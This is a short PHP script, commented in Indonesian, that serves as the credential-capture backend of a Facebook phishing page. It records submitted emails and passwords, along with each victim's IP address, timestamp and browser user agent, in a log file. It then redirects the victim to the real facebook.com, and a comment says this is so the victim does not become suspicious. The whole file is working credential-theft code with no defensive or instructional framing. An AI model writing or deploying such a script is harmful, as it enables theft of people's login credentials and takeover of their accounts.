<?php
// capture.php - Menangkap data login

// Buka file log
$file = 'logs.txt';

// Ambil data dari form
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$useragent = $_SERVER['HTTP_USER_AGENT'];

// Format data
$data = "[$date] IP: $ip | Email: $email | Password: $password | UA: $useragent\n";

// Simpan ke file
file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

// Redirect ke halaman asli biar gak curiga
header('Location: https://facebook.com');
exit;
?>